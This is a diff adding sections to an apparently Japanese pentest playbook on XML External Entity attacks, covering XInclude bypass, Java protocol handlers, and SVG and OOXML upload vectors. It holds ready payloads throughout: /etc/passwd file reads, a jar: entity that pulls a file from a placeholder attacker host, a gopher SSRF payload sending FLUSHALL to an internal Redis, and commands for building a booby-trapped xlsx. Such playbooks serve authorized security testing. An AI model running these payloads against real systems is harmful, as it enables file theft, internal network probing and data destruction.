@@ -3,6 +3,10 @@
 ## 着火条件
 - WebアプリがXMLを入力として受け付けている（フォームのXMLアップロード・APIの `Content-Type: application/xml`・SOAPリクエスト等）
 - サーバー側のXMLパーサーが外部エンティティの処理を許可している
+- **XML 直接アップロードが無くても XXE 経路がある**：
+  - **SVG ファイルアップロード**（プロフィール画像・チャートのインポート等）→ SVG は XML なので、画像処理ライブラリが DOCTYPE を解釈する実装で XXE が発火
+  - **OOXML（`.xlsx` / `.docx` / `.pptx`）アップロード**（Excel/Word のインポート機能）→ OOXML は ZIP + XML の構造で、Apache POI / docx4j / openpyxl 等のパーサが内部 XML を処理する際に DOCTYPE を解釈する実装で発火（CVE-2014-3529 系の Apache POI XXE が代表例）
+  - **画像メタデータ系**（SVG / XMP メタデータ）・**RSS / Atom フィードのインポート**・**SAML Response の処理**（IdP-Initiated SSO）も全て XML パーサが裏で動く
 
 ## 環境前提
 - 実行環境: テスター端末（ペイロード作成）/ ターゲット（XML処理実行）
@@ -153,13 +157,89 @@ echo "BASE64_STRING" | base64 -d   # [Attacker]
 
 > 原理 → `../../06_Concepts/XSLT_XML_Processing.md`
 
+**⑦ XInclude による DOCTYPE 完全ブロック環境の迂回**
+
+`DOCTYPE is not allowed` で DTD が完全に無効化されている環境でも、**XInclude (`http://www.w3.org/2001/XInclude`)** が有効化された XML パーサであれば DTD なしでファイル読み込みができる。DTD ブロック (`DOCTYPE`) と XInclude (`xi:include`) は別の仕様であり、片方だけ無効化している実装が多い。
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
+```
+
+- `parse="text"` を付けないと XML としてパースされる（`/etc/passwd` は XML ではないのでエラー）
+- libxml2 / Xerces / .NET XmlReader が `XInclude` を有効化していると発火
+- DOCTYPE ブロックは突破できるが、XInclude 自体が無効化されている環境では発火しない
+
+**⑧ Java 環境特有の SSRF / file read プロトコル**
+
+Java の XML パーサ（JAXP / Xerces）は **URL handler 経由で多様なプロトコルをサポート**しており、`file://` `http://` 以外にも以下が刺さる:
+
+```xml
+<!-- JAR: jar:!/ を使って ZIP/JAR 内部のファイル読み込み -->
+<!ENTITY xxe SYSTEM "jar:http://[ATTACKER_HOST]/evil.jar!/data.txt">
+<!-- 攻撃者 HTTP サーバから .jar (= ZIP) を取得 → 中の data.txt が読まれる -->
+<!-- 副作用: Java が .jar を /tmp に展開する処理を悪用すると一時ファイル経由の race condition も -->
+
+<!-- netdoc: Java 古典・file:// が WAF で block されているとき迂回経路 -->
+<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">
+
+<!-- ftp: 認証 prompt の有無で内部ホスト存在確認（Blind SSRF 経路） -->
+<!ENTITY xxe SYSTEM "ftp://internal-host:21/">
+
+<!-- gopher: 古い Java 8 以下では HTTP / Redis / SMTP に任意プロトコル送信可（SSRF 経路） -->
+<!ENTITY xxe SYSTEM "gopher://internal-host:6379/_FLUSHALL%0d%0aSET%20pwn">
+```
+
+> Java 9 以降は `jdk.xml.disallowDoctypeDecl=true` がデフォルトの環境が増えているが、レガシーアプリ・Spring Boot 2 系・古い Tomcat デプロイでは未設定のことが多い。
+
+**⑨ SVG アップロード経由の XXE**
+
+プロフィール画像 / アイコン / チャートインポートで SVG が受け入れられる場合、SVG は XML なので XXE ペイロードを仕込める。**ImageMagick / Inkscape / librsvg / rsvg-convert** など SVG をパースするライブラリが DOCTYPE を処理する設定だと発火。
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
+  <text x="0" y="50">&xxe;</text>
+</svg>
+```
+
+アップロード後、SVG が画面に表示される場合は `<text>` 内の `&xxe;` がレンダリング時にファイル内容に展開される。サムネイル生成のみの場合は Blind XXE（⑤）に切り替え。
+
+**⑩ OOXML（xlsx / docx）経由の XXE**
+
+`.xlsx` / `.docx` / `.pptx` は ZIP アーカイブで、中に `[Content_Types].xml`・`word/document.xml`・`xl/workbook.xml` 等の XML が入っている。アプリが Apache POI / docx4j / openpyxl 等でパースするとき、内部 XML の DOCTYPE が処理される実装で発火（CVE-2014-3529 系・Apache POI 3.10.1 以前など）。
+
+```bash
+# [Attacker] 1. 正規の .xlsx を作って unzip
+cp legitimate.xlsx payload.xlsx
+unzip payload.xlsx -d payload_unzipped/
+
+# [Attacker] 2. 内部 XML（xl/workbook.xml など）に DOCTYPE を仕込む
+# 先頭の <?xml ...?> の直後に以下を挿入:
+#   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# そして任意のテキスト要素に &xxe; を埋め込む
+
+# [Attacker] 3. 再圧縮（ZIP として）
+cd payload_unzipped/
+zip -r ../payload_xxe.xlsx .
+cd ..
+
+# [Attacker] 4. アプリにアップロード → パース時に XXE 発火
+```
+
+エラーメッセージにファイル内容が含まれる経路 / 取り込んだスプレッドシートのセル値として表示される経路 / Blind XXE OOB 経路のいずれかで exfil。
+
 ## 刺さらなかったとき
 
-- `DTD is prohibited` / `DOCTYPE is not allowed` → DOCTYPEブロッキングが有効。XXEは使えない。代替としてXPathインジェクション・パラメータ改ざんを検討する
+- `DTD is prohibited` / `DOCTYPE is not allowed` → DOCTYPEブロッキングが有効。**⑦ XInclude (`xi:include`) を試す**（DTD ブロックと XInclude は別仕様で片方だけ無効化されている実装が多い）。XInclude もダメなら XPath インジェクション・パラメータ改ざんを検討
 - `Entity 'xxe' not defined` → 宣言構文が間違っている。`<!ENTITY xxe SYSTEM "...">` の構文を確認する
 - エンティティ参照がそのまま文字列として出力される → パーサーがエンティティ展開を無効化している。XXEは使えない
-- `Cannot resolve URI` → ファイルパスの形式が違う（`file://` と `file:///` の違い）または対象ファイルの読み込み権限不足
+- `Cannot resolve URI` → ファイルパスの形式が違う（`file://` と `file:///` の違い）または対象ファイルの読み込み権限不足。Java 環境なら ⑧ の `netdoc:` / `jar:` プロトコルへ切替
 - ファイルを読めるが内容が空 → XMLとして不正な文字が含まれている。⑥のPHPラッパー（Base64）を試す
+- XML 直接送信ができない（フォームに XML 受付なし）→ ⑨ SVG アップロード・⑩ OOXML アップロード・RSS/SAML 等の隠れ XML 経路を探す
 
 ## 注意点・落とし穴
 
